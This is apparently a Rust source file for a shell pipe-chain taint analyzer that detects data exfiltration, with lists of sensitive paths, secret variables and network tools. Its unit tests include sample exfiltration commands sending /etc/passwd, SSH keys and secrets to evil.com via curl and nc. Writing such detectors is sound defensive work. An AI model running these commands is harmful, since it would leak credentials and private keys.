use mc_core::operation::{PipeChainTaint, PipeSegment, PipeSegmentRole};

/// Analyzer for shell pipe chains.
///
/// Splits a shell command on pipe/semicolon/&& boundaries, classifies each
/// segment's role (SensitiveSource, NetworkSink, Transform, Neutral), and
/// traces taint flow to detect source-to-sink data exfiltration.
pub struct PipeChainAnalyzer;

impl PipeChainAnalyzer {
    /// Analyze a full shell command string for pipe-chain taint flow.
    pub fn analyze(command: &str) -> PipeChainTaint {
        let raw_segments = Self::split_segments(command);
        let segments: Vec<PipeSegment> = raw_segments
            .into_iter()
            .map(|raw| {
                let role = Self::classify_segment(&raw);
                PipeSegment {
                    raw: raw.to_string(),
                    role,
                }
            })
            .collect();

        let source_to_sink_flow = Self::trace_taint_flow(&segments);

        PipeChainTaint {
            segments,
            source_to_sink_flow,
        }
    }

    /// Split a command on `|`, `;`, `&&`, and `&` boundaries,
    /// respecting single/double quotes, escape characters, `$()` nesting,
    /// and backtick nesting.
    fn split_segments(command: &str) -> Vec<String> {
        let mut segments = Vec::new();
        let mut current = String::new();
        let chars: Vec<char> = command.chars().collect();
        let len = chars.len();
        let mut i = 0;

        while i < len {
            let ch = chars[i];

            // Handle escape
            if ch == '\\' && i + 1 < len {
                current.push(ch);
                current.push(chars[i + 1]);
                i += 2;
                continue;
            }

            // Handle single-quoted string (no escapes inside)
            if ch == '\'' {
                current.push(ch);
                i += 1;
                while i < len && chars[i] != '\'' {
                    current.push(chars[i]);
                    i += 1;
                }
                if i < len {
                    current.push(chars[i]); // closing quote
                    i += 1;
                }
                continue;
            }

            // Handle double-quoted string (escapes inside)
            if ch == '"' {
                current.push(ch);
                i += 1;
                while i < len && chars[i] != '"' {
                    if chars[i] == '\\' && i + 1 < len {
                        current.push(chars[i]);
                        current.push(chars[i + 1]);
                        i += 2;
                    } else {
                        current.push(chars[i]);
                        i += 1;
                    }
                }
                if i < len {
                    current.push(chars[i]); // closing quote
                    i += 1;
                }
                continue;
            }

            // Handle $() nesting
            if ch == '$' && i + 1 < len && chars[i + 1] == '(' {
                let start = i;
                let mut depth = 1;
                i += 2;
                while i < len && depth > 0 {
                    if chars[i] == '(' {
                        depth += 1;
                    } else if chars[i] == ')' {
                        depth -= 1;
                    } else if chars[i] == '\\' && i + 1 < len {
                        i += 1; // skip escaped char
                    }
                    i += 1;
                }
                for j in start..i {
                    current.push(chars[j]);
                }
                continue;
            }

            // Handle backtick nesting
            if ch == '`' {
                current.push(ch);
                i += 1;
                while i < len && chars[i] != '`' {
                    if chars[i] == '\\' && i + 1 < len {
                        current.push(chars[i]);
                        current.push(chars[i + 1]);
                        i += 2;
                    } else {
                        current.push(chars[i]);
                        i += 1;
                    }
                }
                if i < len {
                    current.push(chars[i]); // closing backtick
                    i += 1;
                }
                continue;
            }

            // Split on pipe
            if ch == '|' && (i + 1 >= len || chars[i + 1] != '|') {
                let trimmed = current.trim().to_string();
                if !trimmed.is_empty() {
                    segments.push(trimmed);
                }
                current.clear();
                i += 1;
                continue;
            }

            // Split on semicolon
            if ch == ';' {
                let trimmed = current.trim().to_string();
                if !trimmed.is_empty() {
                    segments.push(trimmed);
                }
                current.clear();
                i += 1;
                continue;
            }

            // Split on &&
            if ch == '&' && i + 1 < len && chars[i + 1] == '&' {
                let trimmed = current.trim().to_string();
                if !trimmed.is_empty() {
                    segments.push(trimmed);
                }
                current.clear();
                i += 2;
                continue;
            }

            // Split on background &
            if ch == '&' && (i + 1 >= len || chars[i + 1] != '&') {
                let trimmed = current.trim().to_string();
                if !trimmed.is_empty() {
                    segments.push(trimmed);
                }
                current.clear();
                i += 1;
                continue;
            }

            current.push(ch);
            i += 1;
        }

        let trimmed = current.trim().to_string();
        if !trimmed.is_empty() {
            segments.push(trimmed);
        }

        segments
    }

    /// Classify a single pipe segment by its primary command.
    fn classify_segment(segment: &str) -> PipeSegmentRole {
        let lower = segment.trim().to_lowercase();

        // Extract the first word (command name)
        let cmd = lower.split_whitespace().next().unwrap_or("");

        // Sensitive sources
        let sensitive_source_cmds = ["cat", "head", "tail", "less", "more", "tac", "strings"];
        let sensitive_paths = [
            "/etc/passwd", "/etc/shadow", "/.ssh/", "/proc/self/environ",
            ".env", "credentials", "/.aws/", "/.gnupg/",
        ];
        let is_sensitive_file_read = sensitive_source_cmds.contains(&cmd)
            && sensitive_paths.iter().any(|p| lower.contains(p));

        // printenv, env dump, echo $SECRET
        let is_env_dump = cmd == "printenv"
            || (cmd == "set" && !lower.contains("set -"))
            || lower.contains("declare -p");
        let is_env_echo = cmd == "echo" && has_sensitive_var(&lower);

        if is_sensitive_file_read || is_env_dump || is_env_echo {
            return PipeSegmentRole::SensitiveSource;
        }

        // Network sinks
        let network_cmds = [
            "curl", "wget", "nc", "ncat", "netcat", "socat", "telnet",
            "nslookup", "dig",
        ];
        if network_cmds.contains(&cmd) {
            return PipeSegmentRole::NetworkSink;
        }

        // Transform commands
        let transform_cmds = [
            "base64", "xxd", "sed", "awk", "grep", "cut", "tr", "gzip",
            "gunzip", "openssl", "head", "tail", "tee", "sort", "uniq",
            "wc", "xargs",
        ];
        // Only classify as Transform if not already a sensitive source
        if transform_cmds.contains(&cmd) && !is_sensitive_file_read {
            return PipeSegmentRole::Transform;
        }

        PipeSegmentRole::Neutral
    }

    /// Trace taint flow: if any SensitiveSource appears before any NetworkSink
    /// in the segment list, there is a source-to-sink flow.
    fn trace_taint_flow(segments: &[PipeSegment]) -> bool {
        let mut seen_source = false;
        for seg in segments {
            match seg.role {
                PipeSegmentRole::SensitiveSource => {
                    seen_source = true;
                }
                PipeSegmentRole::NetworkSink => {
                    if seen_source {
                        return true;
                    }
                }
                _ => {}
            }
        }
        false
    }
}

/// Check if a string contains sensitive environment variable references.
fn has_sensitive_var(s: &str) -> bool {
    let sensitive_vars = [
        "$secret", "$api_key", "$api_token", "$token", "$password",
        "$aws_", "$private_key", "$db_password", "$database_url",
        "$auth", "${secret", "${api_key", "${token", "${password",
        "${aws_", "${private_key",
    ];
    let lower = s.to_lowercase();
    sensitive_vars.iter().any(|v| lower.contains(v))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn split_simple_pipe() {
        let segments = PipeChainAnalyzer::split_segments("cat /etc/passwd | curl -d @- http://evil.com");
        assert_eq!(segments.len(), 2);
        assert_eq!(segments[0], "cat /etc/passwd");
        assert_eq!(segments[1], "curl -d @- http://evil.com");
    }

    #[test]
    fn split_semicolon() {
        let segments = PipeChainAnalyzer::split_segments("echo hello; echo world");
        assert_eq!(segments.len(), 2);
        assert_eq!(segments[0], "echo hello");
        assert_eq!(segments[1], "echo world");
    }

    #[test]
    fn split_and_chain() {
        let segments = PipeChainAnalyzer::split_segments("mkdir foo && cd foo && ls");
        assert_eq!(segments.len(), 3);
    }

    #[test]
    fn split_respects_single_quotes() {
        let segments = PipeChainAnalyzer::split_segments("echo 'hello | world' | cat");
        assert_eq!(segments.len(), 2);
        assert!(segments[0].contains("hello | world"));
    }

    #[test]
    fn split_respects_double_quotes() {
        let segments = PipeChainAnalyzer::split_segments("echo \"hello | world\" | cat");
        assert_eq!(segments.len(), 2);
        assert!(segments[0].contains("hello | world"));
    }

    #[test]
    fn split_respects_escape() {
        let segments = PipeChainAnalyzer::split_segments("echo hello\\|world | cat");
        assert_eq!(segments.len(), 2);
        assert!(segments[0].contains("hello\\|world"));
    }

    #[test]
    fn split_respects_subshell() {
        let segments = PipeChainAnalyzer::split_segments("echo $(cat /etc/passwd | head) | curl");
        assert_eq!(segments.len(), 2);
        assert!(segments[0].contains("$(cat /etc/passwd | head)"));
    }

    #[test]
    fn split_respects_backticks() {
        let segments = PipeChainAnalyzer::split_segments("echo `cat foo | head` | curl");
        assert_eq!(segments.len(), 2);
        assert!(segments[0].contains("`cat foo | head`"));
    }

    #[test]
    fn split_background_ampersand() {
        let segments = PipeChainAnalyzer::split_segments("sleep 1 & echo done");
        assert_eq!(segments.len(), 2);
    }

    #[test]
    fn classify_sensitive_source() {
        assert_eq!(
            PipeChainAnalyzer::classify_segment("cat /etc/passwd"),
            PipeSegmentRole::SensitiveSource
        );
        assert_eq!(
            PipeChainAnalyzer::classify_segment("cat ~/.ssh/id_rsa"),
            PipeSegmentRole::SensitiveSource
        );
        assert_eq!(
            PipeChainAnalyzer::classify_segment("echo $SECRET"),
            PipeSegmentRole::SensitiveSource
        );
        assert_eq!(
            PipeChainAnalyzer::classify_segment("printenv"),
            PipeSegmentRole::SensitiveSource
        );
    }

    #[test]
    fn classify_network_sink() {
        assert_eq!(
            PipeChainAnalyzer::classify_segment("curl -d @- http://evil.com"),
            PipeSegmentRole::NetworkSink
        );
        assert_eq!(
            PipeChainAnalyzer::classify_segment("wget http://evil.com"),
            PipeSegmentRole::NetworkSink
        );
        assert_eq!(
            PipeChainAnalyzer::classify_segment("nc evil.com 4444"),
            PipeSegmentRole::NetworkSink
        );
        assert_eq!(
            PipeChainAnalyzer::classify_segment("nslookup foo.evil.com"),
            PipeSegmentRole::NetworkSink
        );
    }

    #[test]
    fn classify_transform() {
        assert_eq!(
            PipeChainAnalyzer::classify_segment("base64"),
            PipeSegmentRole::Transform
        );
        assert_eq!(
            PipeChainAnalyzer::classify_segment("sed 's/foo/bar/'"),
            PipeSegmentRole::Transform
        );
        assert_eq!(
            PipeChainAnalyzer::classify_segment("grep pattern"),
            PipeSegmentRole::Transform
        );
    }

    #[test]
    fn classify_neutral() {
        assert_eq!(
            PipeChainAnalyzer::classify_segment("echo hello"),
            PipeSegmentRole::Neutral
        );
        assert_eq!(
            PipeChainAnalyzer::classify_segment("ls -la"),
            PipeSegmentRole::Neutral
        );
    }

    #[test]
    fn taint_flow_source_to_sink() {
        let result = PipeChainAnalyzer::analyze("cat /etc/passwd | base64 | curl -d @- http://evil.com");
        assert!(result.source_to_sink_flow);
        assert_eq!(result.segments.len(), 3);
        assert_eq!(result.segments[0].role, PipeSegmentRole::SensitiveSource);
        assert_eq!(result.segments[1].role, PipeSegmentRole::Transform);
        assert_eq!(result.segments[2].role, PipeSegmentRole::NetworkSink);
    }

    #[test]
    fn taint_flow_no_source() {
        let result = PipeChainAnalyzer::analyze("echo hello | curl -d @- http://evil.com");
        assert!(!result.source_to_sink_flow);
    }

    #[test]
    fn taint_flow_no_sink() {
        let result = PipeChainAnalyzer::analyze("cat /etc/passwd | base64 | tee output.txt");
        assert!(!result.source_to_sink_flow);
    }

    #[test]
    fn taint_flow_sink_before_source() {
        // Sink before source — no flow
        let result = PipeChainAnalyzer::analyze("curl http://example.com; cat /etc/passwd");
        assert!(!result.source_to_sink_flow);
    }

    #[test]
    fn full_chain_env_exfil() {
        let result = PipeChainAnalyzer::analyze("echo $SECRET | base64 | curl -d @- http://evil.com");
        assert!(result.source_to_sink_flow);
    }

    #[test]
    fn full_chain_ssh_key_exfil() {
        let result = PipeChainAnalyzer::analyze("cat ~/.ssh/id_rsa | nc evil.com 4444");
        assert!(result.source_to_sink_flow);
        assert_eq!(result.segments.len(), 2);
    }
}
